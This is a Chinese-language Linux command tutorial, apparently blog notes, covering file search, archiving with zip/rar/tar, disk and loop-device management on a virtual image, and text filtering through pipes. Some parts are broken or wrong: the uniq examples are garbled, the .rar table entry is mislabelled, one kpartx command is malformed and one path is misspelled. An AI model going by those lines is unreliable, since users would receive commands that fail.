<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ locate /etc/sh    #查找 /etc 下所有以 sh 开头的文件，此方式通过&quot;/var/lib/mlocate/mlocate.db&quot;数据库查找</span><br><span class="line">$ locate /usr/share/\*.jpg   #查找 /usr/share/ 下所有 jpg 文件（添加*号前面的反斜杠转义）</span><br><span class="line">-c   #统计数目</span><br><span class="line">-i   #忽略大小写查找</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>find</code><br>通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳，文件的权限等）进行搜索</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find /etc/ -name interfaces     #指定目录下搜索指定文件名的文件</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>注意 find 命令的路径是作为第一个参数的， 基本命令格式为 find [path] [option] [action]</p>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-atime</td>
<td style="text-align:left">最后访问时间</td>
</tr>
<tr>
<td>-ctime</td>
<td style="text-align:left">创建时间</td>
</tr>
<tr>
<td>-mtime</td>
<td style="text-align:left">最后修改时间</td>
</tr>
</tbody>
</table>
<p><code>-mtime</code>参数举例：</p>
<ul>
<li><code>-mtime n</code>: n 为数字，表示为在n天之前的”一天之内“修改过的文件</li>
<li><code>-mtime +n</code>: 列出在n天之前（不包含n天本身）被修改过的文件</li>
<li><code>-mtime -n</code>: 列出在n天之内（包含n天本身）被修改过的文件</li>
<li><code>newer file</code>: file为一个已存在的文件，列出比file还要新的文件名<br><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-8.png" alt=""></li>
</ul>
<h1><span id="文件打包与压缩">文件打包与压缩</span></h1><h2><span id="文件打包和解压缩">文件打包和解压缩</span></h2><table>
<thead>
<tr>
<th>文件后缀名</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*.zip</td>
<td style="text-align:left">zip程序打包压缩的文件</td>
</tr>
<tr>
<td>*.rar</td>
<td style="text-align:left">创建时间</td>
</tr>
<tr>
<td>*.7z</td>
<td style="text-align:left">7zip程序压缩的文件</td>
</tr>
<tr>
<td>*.tar</td>
<td style="text-align:left">tar程序打包，未压缩的文件</td>
</tr>
<tr>
<td>*.gz</td>
<td style="text-align:left">gzip程序(GNU zip)压缩的文件</td>
</tr>
<tr>
<td>*.xz</td>
<td style="text-align:left">xz程序压缩的文件</td>
</tr>
<tr>
<td>*.bz2</td>
<td style="text-align:left">bzip2程序压缩的文件</td>
</tr>
<tr>
<td>*.tar.gz</td>
<td style="text-align:left">tar打包，gzip程序压缩的文件</td>
</tr>
<tr>
<td>*.tar.xz</td>
<td style="text-align:left">tar打包，xz程序压缩的文件</td>
</tr>
<tr>
<td>*tar.bz2</td>
<td style="text-align:left">tar打包，bzip2程序压缩的文件</td>
</tr>
<tr>
<td>*.tar.7z</td>
<td style="text-align:left">tar打包，7z程序压缩的文件</td>
</tr>
</tbody>
</table>
<h3><span id="zip压解打包程序">zip压解打包程序</span></h3><ul>
<li>使用zip打包文件包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q -o shiyanlou.zip /home/shiyanlou    #-r参数表示递归打包包含子目录的全部内容，-q参数表示为安静模式，即不向屏幕输出信息，-o，表示输出文件，需在其后紧跟打包输出文件名</span><br><span class="line">$ du -h shiyanlou.zip    #du命令查看打包后文件的大小</span><br><span class="line">$ file shiyanlou.zip</span><br></pre></td></tr></table></figure>
<ul>
<li>设置压缩级别为9和1（9最大，1最小），重新打包：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -9 -q -o shiyanlou_9.zip /home/shiyanlou -x ~/*.zip     #设置压缩级别-[1-9]</span><br><span class="line">$ zip -r -1 -q -o shiyanlou_1.zip /home/shiyanlou -x ~/*.zip     #1表示最快压缩但体积大，9表示体积最小但耗时最久</span><br><span class="line">$ du -h -d 0 *.zip ~ | sort      #du命令分别查看默认压缩级别、最低、最高压缩级别及未压缩的文件的大小</span><br></pre></td></tr></table></figure>
<ul>
<li>创建加密zip包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -e -o shiyanlou_encryption.zip /home/shiyanlou   #-e参数可以创建加密压缩包</span><br><span class="line">$ zip -r -l -o shiyanlou.zip /home/shiyanlou              #-l参数将LF转换为CR+LF</span><br></pre></td></tr></table></figure>
<p>在 Windows 为 CR+LF（Carriage-Return+Line-Feed：回车加换行），而在 Linux/Unix 上为 LF（换行），所以如果在不加处理的情况下，在 Linux 上编辑的文本，在 Windows 系统上打开可能看起来是没有换行的。</p>
<h3><span id="使用unzip命令解压缩zip文件">使用unzip命令解压缩zip文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ unzip shiyanlou.zip                    #将shiyanlou.zip解压到当前目录</span><br><span class="line">$ unzip -q shiyanlou.zip -d ziptest      #安静模式，将文件解压到指定目录</span><br><span class="line">$ unzip -l shiyanlou.zip                 #仅查看压缩包的内容</span><br><span class="line">unzip -O GBK 中文压缩文件.zip            #使用-O 参数指定编码类型</span><br></pre></td></tr></table></figure>
<h3><span id="rar打包压缩命令">rar打包压缩命令</span></h3><ul>
<li>安装rar和unrar工具</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update              </span><br><span class="line">$ sudo apt-get install rar unrar</span><br></pre></td></tr></table></figure>
<ul>
<li>从指定文件或目录创建压缩包或添加文件到压缩包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ rm *.zip               #a参数添加一个目录～到一个归档文件中，如果该文件不存在就会自动创建</span><br><span class="line">$ rar a shiyanlou.rar</span><br></pre></td></tr></table></figure>
<p><code>注意：rar 的命令参数没有-，如果加上会报错</code></p>
<ul>
<li>从指定压缩包文件中删除某个文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rar d shiyanlou.rar .zshrc</span><br></pre></td></tr></table></figure>
<ul>
<li><p>查看不解压文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rar l shiyanlou.rar</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用unrar解压rar文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unrar x shiyanlou.rar			#全路径解压</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir tmp						#去路径解压</span><br><span class="line">$ unrar e shiyanlou.rar tmp/</span><br></pre></td></tr></table></figure>
<h3><span id="tar打包工具">tar打包工具</span></h3><ul>
<li>创建一个tar包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cf shiyanlou.tar ~</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/6-4.png" alt=""><br><code>-c</code>表示创建一个 tar 包文件，<code>-f</code>用于指定创建的文件名，注意文件名必须紧跟在<code>-f</code>参数之后，比如不能写成<code>tar -fc shiyanlou.tar</code>，可以写成<code>tar -f shiyanlou.tar -c ~</code>。你还可以加上<code>-v</code>参数以可视的的方式输出打包的文件。上面会自动去掉表示绝对路径的<code>/</code>，你也可以使用<code>-P</code>保留绝对路径符。</p>
<ul>
<li><p>解包一个文件（-x参数）到指定路径的已存在目录（-C参数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir tardir</span><br><span class="line">$ tar -xf shiyanlou.tar -C tardir</span><br></pre></td></tr></table></figure>
</li>
<li><p>只查看不解包文件-t参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -tf shiyanlou.tar</span><br></pre></td></tr></table></figure>
</li>
<li><p>保留文件属性和跟随链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cphf etc.tar /etc    #还原时希望保留文件的属性(-p参数)和备份链接指向的源文件而不是链接本身(-h参数)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建tar文件的基础上添加-z参数，使用gzip来压缩文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -czf shiyanlou.tar.gz ~</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压*.tar.gz文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xzf shiyanlou.tar.gz</span><br></pre></td></tr></table></figure>
</li>
</ul>
<table>
<thead>
<tr>
<th>文件后缀名</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*.tar.gz</td>
<td style="text-align:left">-z</td>
</tr>
<tr>
<td>*.tar.xz</td>
<td style="text-align:left">-J</td>
</tr>
<tr>
<td>*.tar.bz2</td>
<td style="text-align:left">-j</td>
</tr>
</tbody>
</table>
<h1><span id="文件系统操作与磁盘管理">文件系统操作与磁盘管理</span></h1><h2><span id="简单文件系统操作">简单文件系统操作</span></h2><h3><span id="查看磁盘和目录的容量">查看磁盘和目录的容量</span></h3><h4><span id="使用df命令查看磁盘的容量">使用df命令查看磁盘的容量</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>“rootfs” : （Root File System）它是 Ramfs（Ramfs 是一个非常简单的 Linux 文件系统用于实现磁盘缓存机制作为动态可调整大小的基于 ram 的文件系统）或者 tmpfs 的一个特殊实例，它作为系统启动时内核载入内存之后，在挂载真正的的磁盘之前的一个临时文件系统。通常的主机会在系统启动后用磁盘上的文件系统替换，只是在一些嵌入式系统中会只存在一个 rootfs ，或者像我们目前遇到的情况运行在虚拟环境中共享主机资源的系统也可能会采用这种方式。</p>
</blockquote>
</blockquote>
<p>物理主机上的 /dev/sda2 是对应着主机硬盘的分区，后面的数字表示分区号，数字前面的字母 a 表示第几块硬盘（也可能是可移动磁盘）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h   #查看主机磁盘的使用情况</span><br></pre></td></tr></table></figure>
<h4><span id="使用du命令查看目录的容量">使用du命令查看目录的容量</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 默认同样以 blocks 的大小展示</span><br><span class="line">$ du </span><br><span class="line"># 加上`-h`参数，以更易读的方式展示</span><br><span class="line">$ du -h</span><br></pre></td></tr></table></figure>
<p><code>-d</code>参数指定查看目录的深度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 只查看1级目录的信息</span><br><span class="line">$ du -h -d 0 ~</span><br><span class="line"># 查看2级</span><br><span class="line">$ du -h -d 1 ~</span><br></pre></td></tr></table></figure></p>
<h2><span id="简单磁盘管理">简单磁盘管理</span></h2><h3><span id="dd命令简介">dd命令简介</span></h3><p><code>dd</code>命令用于转换和复制文件，不过它的复制不同于<code>cp</code>。之前提到过关于 Linux 的很重要的一点，<strong>一切即文件</strong>，在 Linux 上，硬件的设备驱动（如硬盘）和特殊设备文件（如<code>/dev/zero</code>和<code>/dev/random</code>）都像普通文件一样，只要在各自的驱动程序中实现了对应的功能，dd 也可以读取自和/或写入到这些文件。这样，<code>dd</code>也可以用在备份硬件的引导扇区、获取一定数量的随机数据或者空数据等任务中。<code>dd</code>程序也可以在复制时处理数据，例如转换字节序、或在 ASCII 与  EBCDIC 编码间互换。</p>
<p><code>dd</code>的命令行语句与其他的 Linux 程序不同，因为它的命令行选项格式为<code>选项=值</code>，而不是更标准的<code>--选项 值</code>或<code>-选项=值</code>。<code>dd</code>默认从标准输入中读取，并写入到标准输出中，但可以用选项<code>if</code>（input file，输入文件）和<code>of</code>（output file，输出文件）改变。</p>
<p>我们先来试试用<code>dd</code>命令从标准输入读入用户输入到标准输出或者一个文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 输出到文件</span><br><span class="line">$ dd of=test bs=10 count=1 # 或者 dd if=/dev/stdin of=test bs=10 count=1</span><br><span class="line"># 输出到标准输出</span><br><span class="line">$ dd if=/dev/stdin of=/dev/stdout bs=10 count=1</span><br></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-5.png/logoblackfont" alt=""><br>上述命令从标准输入设备读入用户输入（缺省值，所以可省略）然后输出到 test 文件，<code>bs</code>（block size）用于指定块大小（缺省单位为 Byte，也可为其指定如’K’，’M’，’G’等单位），<code>count</code>用于指定块数量。如上图所示，我指定只读取总共 10 个字节的数据，当我输入了“hello shiyanlou”之后加上空格回车总共 16 个字节（一个英文字符占一个字节）内容，显然超过了设定大小。使用和<code>du</code>和<code>cat</code>命令看到的写入完成文件实际内容确实只有 10 个字节（那个黑底百分号表示这里没有换行符）,而其他的多余输入将被截取并保留在标准输入。 前面说到<code>dd</code>在拷贝的同时还可以实现数据转换，那下面就举一个简单的例子：将输出的英文字符转换为大写再写入文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=/dev/stdin of=test bs=10 count=1 conv=ucase</span><br></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-6.png/logoblackfont" alt=""></p>
<h3><span id="使用dd命令创建虚拟镜像文件">使用dd命令创建虚拟镜像文件</span></h3><p>从<code>/dev/zero</code>设备创建一个容量为 256M 的空文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=/dev/zero of=virtual.img bs=1M count=256</span><br><span class="line">$ du -h virtual.img</span><br></pre></td></tr></table></figure></p>
<h3><span id="使用mkfs命令格式化磁盘">使用mkfs命令格式化磁盘</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkfs.ext4 virtual.img     #虚拟磁盘镜像格式化为ext4文件系统</span><br></pre></td></tr></table></figure>
<h3><span id="使用mount命令挂载磁盘到目录树">使用mount命令挂载磁盘到目录树</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount           #查看主机已挂载的文件系统</span><br></pre></td></tr></table></figure>
<p>mount命令的一般格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount [-o [操作选项]] [-t 文件系统类型] [-w|--rw|--ro] [文件系统源] [挂载点]</span><br></pre></td></tr></table></figure></p>
<p>常用操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount [-o [操作选项]] [-t 文件系统类型] [-w|--rw|--ro] [文件系统源] [挂载点]</span><br></pre></td></tr></table></figure></p>
<p>挂载到/mnt目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ mount -o loop -t ext4 virtual.img /mnt </span><br><span class="line"># 也可以省略挂载类型，很多时候 mount 会自动识别</span><br><span class="line"></span><br><span class="line"># 以只读方式挂载</span><br><span class="line">$ mount -o loop --ro virtual.img /mnt</span><br><span class="line"># 或者mount -o loop,ro virtual.img /mnt</span><br></pre></td></tr></table></figure></p>
<blockquote>
<blockquote>
<p>在类 UNIX 系统中，/dev/loop（或称vnd （vnode disk）、lofi（循环文件接口））是一种伪设备，这种设备使得文件可以如同块设备一般被访问。在使用之前，循环设备必须与现存文件系统上的文件相关联。这种关联将提供给用户一个应用程序接口，接口将允许文件视为块特殊文件（参见设备文件系统）使用。因此，如果文件中包含一个完整的文件系统，那么这个文件就能如同磁盘设备一般被挂载。这种设备文件经常被用于光盘或是磁盘镜像。通过循环挂载来挂载包含文件系统的文件，便使处在这个文件系统中的文件得以被访问。这些文件将出现在挂载点目录。如果挂载目录中本身有文件，这些文件在挂载后将被禁止使用。</p>
</blockquote>
</blockquote>
<h3><span id="使用umount命令卸载已挂载磁盘">使用umount命令卸载已挂载磁盘</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 命令格式 sudo umount 已挂载设备名或者挂载点，如：</span><br><span class="line">$ sudo umount /mnt</span><br></pre></td></tr></table></figure>
<h3><span id="使用fdisk为磁盘分区">使用fdisk为磁盘分区</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看硬盘分区表信息</span><br><span class="line">$ sudo fdisk -l</span><br></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-12.png/logo" alt=""></p><p></p>
<p>输出结果中开头显示了主机上的磁盘的一些信息，包括容量扇区数，扇区大小，I/O 大小等信息。</p>
<p>/dev/sda1，/dev/sda2 为主分区分别安装了 Windows 和 Linux 操作系统，/dev/sda3 为交换分区（可以理解为虚拟内存），/dev/sda4 为扩展分区其中包含 /dev/sda5，/dev/sda6，/dev/sda7，/dev/sda8 四个逻辑分区，因为主机上有几个分区之间有空隙，没有对齐边界扇区,所以分区之间的不是完全连续的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 进入磁盘分区模式</span><br><span class="line">$ sudo fdisk virtual.img</span><br></pre></td></tr></table></figure>
<h3><span id="使用lostup命令建立镜像与回环设备的关联">使用lostup命令建立镜像与回环设备的关联</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo losetup /dev/loop0 virtual.img</span><br><span class="line"># 如果提示设备忙你也可以使用其它的回环设备，&quot;ls /dev/loop*&quot;参看所有回环设备</span><br><span class="line"></span><br><span class="line"># 解除设备关联</span><br><span class="line">$ sudo losetup -d /dev/loop0</span><br></pre></td></tr></table></figure>
<p>然后再使用<code>mkfs</code>格式化各分区（前面我们是格式化整个虚拟磁盘镜像文件或磁盘），不过格式化之前，我们还要为各分区建立虚拟设备的映射，用到<code>kpartx</code>工具，需要先安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install kpartx</span><br><span class="line">$ sudo kpart kpartx -av /dev/loop0</span><br><span class="line"></span><br><span class="line"># 取消映射</span><br><span class="line">$ sudo kpart kpartx -dv /dev/loop0</span><br></pre></td></tr></table></figure>
<pre><code>![](https://dn-anything-about-doc.qbox.me/linux_base/7-15.png)

接着再是格式化，我们将其全部格式化为 ext4：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkfs.ext4 -q /dev/mapper/loop0p1</span><br><span class="line">$ sudo mkfs.ext4 -q /dev/mapper/loop0p5</span><br><span class="line">$ sudo mkfs.ext4 -q /dev/mapper/loop0p6</span><br></pre></td></tr></table></figure>
<pre><code>格式化完成后在`/media`目录下新建四个空目录用于挂载虚拟磁盘：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p /media/virtualdisk_&#123;1..3&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 挂载磁盘分区</span><br><span class="line">$ sudo mount /dev/mapper/loop0p1 /media/virtualdisk_1</span><br><span class="line">$ sudo mount /dev/mapper/loop0p5 /media/virtualdisk_2</span><br><span class="line">$ sudo mount /dev/mapper/loop0p6 /media/virtualdisk_3</span><br><span class="line"></span><br><span class="line"># 卸载磁盘分区</span><br><span class="line">$ sudo umount /dev/mapper/loop0p1</span><br><span class="line">$ sudo umount /dev/mapper/loop0p5</span><br><span class="line">$ sudo umount /dev/mapper/loop0p6</span><br></pre></td></tr></table></figure>
<pre><code>然后：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/7-16.png" alt=""></p>
<h1><span id="命令执行顺序控制与管道">命令执行顺序控制与管道</span></h1><h2><span id="命令执行顺序的控制">命令执行顺序的控制</span></h2><h3><span id="顺序执行多条命令">顺序执行多条命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"># 等待——————————然后输入下面的命令</span><br><span class="line">$ sudo apt-get install some-tool</span><br><span class="line"># 等待——————————然后输入下面的命令</span><br><span class="line">$ some-tool</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update;sudo apt-get install some-tool;some-tool</span><br><span class="line"># 让它自己运行</span><br></pre></td></tr></table></figure>
<h2><span id="管道">管道</span></h2><p>管道是什么,管道是一种通信机制，通常用于进程间的通信（也可通过socket进行网络通信），它表现出来的形式就是将前面每一个进程的输出(stdout)直接作为下一个进程的输入(stdin)。管道又分为匿名管道和具名管道（这里将不会讨论在源程序中使用系统调用创建并使用管道的情况，它与命令行的管道在内核中实际都是采用相同的机制）。我们在使用一些过滤程序时经常会用到的就是匿名管道，在命令行中由<code>|</code>分隔符表示，<code>|</code>在前面的内容中我们已经多次使用到了。具名管道简单的说就是有名字的管道，通常只会在源程序中用到具名管道。下面我们就将通过一些常用的可以使用管道的”过滤程序”来帮助你熟练管道的使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /etc | less       #过管道将前一个命令(ls)的输出作为下一个命令(less)的输入</span><br></pre></td></tr></table></figure>
<h3><span id="cut命令打印每一行的某一个字段">cut命令，打印每一行的某一个字段</span></h3><p>打印/etc/passwd文件中以:为分隔符的第1个字段和第6个字段分别表示用户名和其家目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cut /etc/passwd -d &apos;:&apos; -f 1,6</span><br></pre></td></tr></table></figure>
<p>打印/etc/passwd文件中每一行的前N个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 前五个（包含第五个）</span><br><span class="line">$ cut /etc/passwd -c -5</span><br><span class="line"># 前五个之后的（包含第五个）</span><br><span class="line">$ cut /etc/passwd -c 5-</span><br><span class="line"># 第五个</span><br><span class="line">$ cut /etc/passwd -c 5</span><br><span class="line"># 2到5之间的（包含第五个）</span><br><span class="line">$ cut /etc/passwd -c 2-5</span><br></pre></td></tr></table></figure>
<h3><span id="grep命令在文本中或stdin中查找匹配字符串">grep命令，在文本中或stdin中查找匹配字符串</span></h3><p>grep命令的一般形式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [命令选项]... 用于匹配的表达式 [文件]...</span><br></pre></td></tr></table></figure></p>
<p>搜索/home/shiyanlou目录下所有包含”shiyanlou”的所有文本文件，并显示出现在文本中的行号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep -rnI &quot;shiyanlou&quot; ~            #-r 参数表示递归搜索子目录中的文件,-n表示打印匹配项行号，-I表示忽略二进制文件</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看环境变量中以&quot;yanlou&quot;结尾的字符串</span><br><span class="line">$ export | grep &quot;.*yanlou$&quot;           #其中$就表示一行的末尾。</span><br></pre></td></tr></table></figure>
<h3><span id="wc命令">wc命令</span></h3><p>wc 命令用于统计并输出一个文件中行、单词和字节的数目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wc /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 行数</span><br><span class="line">$ wc -l /etc/passwd</span><br><span class="line"># 单词数</span><br><span class="line">$ wc -w /etc/passwd</span><br><span class="line"># 字节数</span><br><span class="line">$ wc -c /etc/passwd</span><br><span class="line"># 字符数</span><br><span class="line">$ wc -m /etc/passwd</span><br><span class="line"># 最长行字节数</span><br><span class="line">$ wc -L /etc/passwd</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -dl /etc/*/ | wc -l       #结合管道来操作一下，统计 /etc 下面所有目录数</span><br></pre></td></tr></table></figure>
<h3><span id="sort排序命令">sort排序命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passswd | sort                #默认为字典排序</span><br><span class="line">$ cat /etc/passwd | sort -r              #反转排序</span><br><span class="line">$ cat /etc/passwd | sort -t&apos;:&apos; -k 3      #按特定字段排序</span><br></pre></td></tr></table></figure>
<p>-t参数用于指定字段的分隔符，这里是以”:”作为分隔符；-k 字段号用于指定对哪一个字段进行排序。这里/etc/passwd文件的第三个字段为数字，默认情况下是一字典序排序的，如果要按照数字排序就要加上-n参数</p>
<h3><span id="uniq去重命令">uniq去重命令</span></h3><ul>
<li>过滤重复行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|         |         | uniq</span><br></pre></td></tr></table></figure>
<ul>
<li>输出重复行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 输出重复过的行（重复的只输出一个）及重复次数</span><br><span class="line"> |         |         | uniq -dc</span><br><span class="line"># 输出所有重复的行</span><br><span class="line"> |         |         | uniq -D</span><br></pre></td></tr></table></figure>
<h1><span id="简单的文本处理">简单的文本处理</span></h1><h2><span id="文本处理命令">文本处理命令</span></h2><h3><span id="tr-命令">tr 命令</span></h3><p>tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td style="text-align:left">删除和set1匹配的字符，注意不是全词匹配也不是按字符顺序匹配</td>
</tr>
